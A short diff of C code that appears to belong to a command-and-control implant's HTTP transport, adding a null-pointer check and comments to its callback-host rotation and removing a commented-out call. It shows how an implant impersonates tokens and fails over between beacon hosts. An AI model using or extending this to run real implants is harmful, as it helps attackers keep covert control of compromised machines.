@@ -28,9 +28,7 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
     /* we might impersonate a token that lets WinHttpOpen return an Error 5 (ERROR_ACCESS_DENIED) */
     TokenImpersonate( FALSE );
 
-    /* Get our host based on host rotation options */
-    // Instance.Config.Transport.Host = HostRotation();
-
+    /* if we don't have any more hosts left, then exit */
     if ( ! Instance.Config.Transport.Host )
     {
         PUTS( "No hosts left to use... exit now." )
@@ -325,6 +323,7 @@ PHOST_DATA HostRotation( SHORT Strategy )
     {
         DWORD Count = 0;
 
+        /* get linked list */
         Host = Instance.Config.Transport.Hosts;
 
         /* If our current host is empty
@@ -334,6 +333,10 @@ PHOST_DATA HostRotation( SHORT Strategy )
 
         for ( Count = 0; Count < HostCount();  )
         {
+            /* check if it's not an emtpy pointer */
+            if ( ! Host )
+                break;
+
             /* if the host is dead (max retries limit reached) then continue */
             if ( Host->Dead )
                 Host = Host->Next;
